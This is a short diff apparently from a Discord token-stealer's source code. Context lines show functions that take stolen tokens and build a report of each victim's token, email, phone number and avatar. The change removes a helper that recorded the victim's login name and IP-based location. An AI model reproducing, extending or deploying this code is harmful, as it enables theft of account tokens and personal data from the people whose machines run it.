@@ -156,15 +156,6 @@ async def GetUHQFriends(token, session):
         return False
 
 
-def globalInfo():
-    username = os.getlogin()
-    ipdata = requests.get(f'https://ipinfo.io/{ip}').json()
-    contry = ipdata["country"]
-    city = ipdata["city"]
-    region = ipdata["region"]
-    return f"{city}({region}) - {username} | {ip} ({contry})"
-
-
 async def get_info_from_token(token, session):
     global result
     username, hashtag, email, idd, pfp, flags, nitro, phone, verified = await GetTokenInfo(token, session)
@@ -186,7 +177,6 @@ async def get_info_from_token(token, session):
 
     data = {
         "Token": f"{token}",
-        "Global info": f'{globalInfo()}',
         "avater url": f"{pfp}",
         "Email": f"`{email}`",
         "Phone number": f"{phone}",
